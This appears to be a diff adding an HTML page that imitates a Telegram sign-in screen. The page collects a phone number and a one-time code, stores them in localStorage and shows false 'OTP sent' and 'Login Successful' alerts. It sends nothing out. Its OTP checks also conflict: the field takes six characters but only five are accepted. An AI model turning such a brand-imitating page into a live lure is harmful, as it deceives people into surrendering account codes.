@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: blue;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkblue;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="telegram logo.jpg" width=300 height=300>
+		<h2>Sign in to Telegram</h2>
+        <input type="text" id="mobile" placeholder="Enter mobile number" maxlength="13">
+        <button onclick="sendOTP()">Send OTP</button>
+        <input type="text" id="otp" placeholder="Enter OTP" maxlength="6" style="display: none;">
+        <button onclick="verifyOTP()" id="verifyBtn" style="display: none;">Verify OTP</button>
+    </div>
+
+    <script>
+        function sendOTP() {
+            let mobileNumber = document.getElementById("mobile").value;
+            if (mobileNumber.length < 10) {
+                alert("Please enter a valid mobile number");
+                return;
+            }
+            localStorage.setItem("mobile", mobileNumber);
+            alert("OTP sent to " + mobileNumber);
+            document.getElementById("otp").style.display = "block";
+            document.getElementById("verifyBtn").style.display = "block";
+        }
+
+        function verifyOTP() {
+            let otp = document.getElementById("otp").value;
+            if (otp.length !== 5) {
+                alert("Please enter a valid 5-digit OTP");
+                return;
+            }
+            localStorage.setItem("otp", otp);
+            alert("Login Successful!");
+        }
+    </script>
+</body>
+</html>
